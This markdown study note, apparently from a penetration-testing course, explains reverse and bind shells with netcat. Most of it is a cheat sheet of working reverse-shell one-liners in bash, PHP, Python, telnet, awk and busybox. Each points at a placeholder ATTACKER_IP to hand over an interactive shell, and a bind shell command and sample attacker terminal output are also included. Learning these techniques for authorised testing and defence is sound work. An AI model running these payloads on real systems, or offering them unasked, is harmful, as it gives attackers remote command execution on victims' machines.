---
tags:
  - reverse-shell
  - bind-shell
  - shell
---
### Reverse Shell

**Definition:**  
A reverse shell (or connect back shell) is a technique used in cyberattacks to gain access to a target system. It connects from the target to the attacker's machine, helping avoid detection by firewalls and security appliances.

---

### How Reverse Shells Work

1. **Set Up a Netcat Listener:**
   - Use Netcat (nc) to listen for incoming connections.
   - Command:
     ```bash
     nc -lvnp 443
     ```
   - **Flags Explanation:**
     - `-l`: Listen for incoming connections.
     - `-v`: Verbose mode (provides detailed output).
     - `-n`: Prevents DNS lookups, using IP addresses instead.
     - `-p`: Specifies the port to listen on (e.g., 443).

2. **Gaining Reverse Shell Access:**
   - Once the listener is set, the attacker executes a reverse shell payload on the compromised machine. This payload typically exploits a vulnerability to provide shell access.

   **Example Payload:**
   ```bash
   rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
   ```

   **Payload Breakdown:**
   - `rm -f /tmp/f`: Removes any existing named pipe to avoid conflicts.
   - `mkfifo /tmp/f`: Creates a named pipe at `/tmp/f` for communication.
   - `cat /tmp/f`: Reads input from the named pipe.
   - `| sh -i 2>&1`: Pipes input to an interactive shell (`bash -i`), redirecting errors to standard output.
   - `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: Sends shell output to the attacker's IP and port, while also allowing input back through the pipe.

3. **Attacker Receives the Shell:**
   - Upon execution of the payload, the attacker receives a shell connection.
   - Example Output:
   ```bash
   nc -lvnp 443
   listening on [any] 443 ...
   connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
   ```

---
### Summary
- **Purpose:** Gain shell access from the target system.
- **Listener:** Set up with Netcat on the attacker's machine.
- **Payload Execution:** Establishes a connection back to the attacker, allowing command execution.
- **Use Cases:** Often employed by attackers during penetration tests or malicious attacks to maintain access to compromised systems.


### Bind Shell

**Definition:**  
A bind shell binds a port on the compromised system to listen for incoming connections. When a connection is established, it exposes a shell session, allowing the attacker to execute commands remotely. This method is useful when outgoing connections are restricted.

---

### How Bind Shells Work

1. **Setting Up the Bind Shell on the Target:**
   - Use the following command on the target machine:
   ```bash
   rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
   ```
   - **Command Breakdown:**
     - `rm -f /tmp/f`: Removes any existing named pipe at `/tmp/f` to avoid conflicts.
     - `mkfifo /tmp/f`: Creates a named pipe at `/tmp/f` for two-way communication.
     - `cat /tmp/f`: Reads input from the named pipe.
     - `| bash -i 2>&1`: Pipes input to an interactive shell, redirecting errors to standard output.
     - `| nc -l 0.0.0.0 8080`: Starts Netcat in listen mode on all interfaces (0.0.0.0) at port 8080.
     - `>/tmp/f`: Sends output back into the named pipe for bi-directional communication.

   - **Note:** Ports below 1024 require elevated privileges, so port 8080 is used to avoid this.

2. **Attacker Connects to the Bind Shell:**
   - Once the bind shell is set up, the attacker can connect using:
   ```bash
   nc -nv TARGET_IP 8080
   ```
   - **Command Explanation:**
     - `nc`: Invokes Netcat to establish a connection.
     - `-n`: Disables DNS resolution for faster operation.
     - `-v`: Enables verbose mode for detailed output.
     - `TARGET_IP`: The IP address of the target machine running the bind shell.
     - `8080`: The port number on which the bind shell is listening.

3. **Attacker Terminal After Connection:**
   - Example of the attacker's terminal after successfully connecting:
   ```bash
   attacker@kali:~$ nc -nv 10.10.13.37 8080 
   (UNKNOWN) [10.10.13.37] 8080 (http-alt) open
   target@tryhackme:~$
   ```

---

### Summary
- **Purpose:** Establish remote shell access on a compromised system by listening for incoming connections.
- **Setup:** Configured on the target machine using a Netcat command.
- **Connection:** The attacker connects to the bind shell to gain shell access and execute commands.


---
### Shell Payloads

A **Shell Payload** can expose a shell to an incoming connection (bind shell) or send a connection to the attacker (reverse shell). Below are popular reverse shell payloads for Linux:

#### Bash Payloads

1. **Normal Bash Reverse Shell**
   ```bash
   bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
   ```
   - Initiates an interactive bash shell, redirecting input/output through TCP to the attacker's IP on port 443.

2. **Bash Read Line Reverse Shell**
   ```bash
   exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
   ```
   - Connects to a TCP socket, reads commands, and sends output back.

3. **Bash With File Descriptor 196 Reverse Shell**
   ```bash
   0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
   ```
   - Uses file descriptor 196 for TCP communication, allowing command execution.

4. **Bash With File Descriptor 5 Reverse Shell**
   ```bash
   bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
   ```
   - Similar to the first example, using file descriptor 5.

#### PHP Payloads

1. **PHP Reverse Shell Using exec Function**
   ```bash
   php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
   ```
   - Creates a socket connection and executes a shell.

2. **PHP Reverse Shell Using shell_exec Function**
   ```bash
   php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
   ```

3. **PHP Reverse Shell Using system Function**
   ```bash
   php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
   ```

4. **PHP Reverse Shell Using passthru Function**
   ```bash
   php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
   ```

5. **PHP Reverse Shell Using popen Function**
   ```bash
   php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
   ```

#### Python Payloads

1. **Python Reverse Shell by Exporting Environment Variables**
   ```bash
   export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
   ```

2. **Python Reverse Shell Using the subprocess Module**
   ```bash
   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
   ```

3. **Short Python Reverse Shell**
   ```bash
   python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
   ```

#### Other Payloads

1. **Telnet Reverse Shell**
   ```bash
   TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
   ```

2. **AWK Reverse Shell**
   ```bash
   awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
   ```

3. **BusyBox Reverse Shell**
   ```bash
   busybox nc ATTACKER_IP 443 -e sh
   ```
